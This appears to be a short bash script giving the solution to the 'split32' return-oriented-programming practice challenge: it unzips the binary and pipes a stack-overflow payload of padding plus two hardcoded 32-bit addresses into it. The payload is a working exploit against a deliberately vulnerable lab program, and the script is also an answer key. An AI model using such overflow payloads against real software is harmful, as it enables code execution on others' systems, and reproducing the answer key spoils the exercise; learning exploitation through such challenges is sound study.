#!/bin/bash

################################################################################
echo "SPLIT32"
## SOLUTION TO SPLIT32

unzip split32.zip

python -c 'print "A"*44+"\x57\x86\x04\x08"+"\x30\xa0\x04\x08"' | ./split32
